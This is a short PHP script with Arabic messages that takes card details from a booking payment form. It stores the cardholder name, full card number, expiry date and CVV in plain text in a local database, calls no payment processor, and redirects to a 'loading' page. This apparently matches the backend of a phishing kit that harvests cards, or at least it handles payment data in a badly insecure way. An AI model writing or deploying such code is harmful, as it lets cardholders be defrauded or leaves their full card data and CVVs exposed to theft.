<?php
session_start();
require_once 'db.php';  // ملف اتصال قاعدة البيانات

$appointment_id = $_SESSION['appointment_id'] ?? null;
if (!$appointment_id) {
    die("معرف الحجز غير موجود.");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardholder = trim($_POST['cardholder']);
    $cardnumber = trim($_POST['cardnumber']);
    $expiry_month = $_POST['expiry_month'];
    $expiry_year = $_POST['expiry_year'];
    $cvv = trim($_POST['cvv']);

    if (empty($cardholder) || empty($cardnumber) || empty($expiry_month) || empty($expiry_year) || empty($cvv)) {
        die("جميع حقول الدفع مطلوبة.");
    }

    $check_stmt = $conn->prepare("SELECT id FROM payments WHERE appointment_id = ?");
    $check_stmt->bind_param("i", $appointment_id);
    $check_stmt->execute();
    $check_stmt->store_result();

    if ($check_stmt->num_rows > 0) {
        $update_stmt = $conn->prepare("UPDATE payments SET cardholder=?, cardnumber=?, expiry_month=?, expiry_year=?, cvv=? WHERE appointment_id=?");
        $update_stmt->bind_param("sssssi", $cardholder, $cardnumber, $expiry_month, $expiry_year, $cvv, $appointment_id);
        if ($update_stmt->execute()) {
            header("Location: loading.php?id=$appointment_id");
            exit;
        } else {
            die("حدث خطأ في التحديث: " . $conn->error);
        }
    } else {
        $insert_stmt = $conn->prepare("INSERT INTO payments (appointment_id, cardholder, cardnumber, expiry_month, expiry_year, cvv) VALUES (?, ?, ?, ?, ?, ?)");
        $insert_stmt->bind_param("isssss", $appointment_id, $cardholder, $cardnumber, $expiry_month, $expiry_year, $cvv);
        if ($insert_stmt->execute()) {
            header("Location: loading.php?id=$appointment_id");
            exit;
        } else {
            die("حدث خطأ في الإدخال: " . $conn->error);
        }
    }
} else {
    die("طريقة الطلب غير مدعومة.");
}
?>
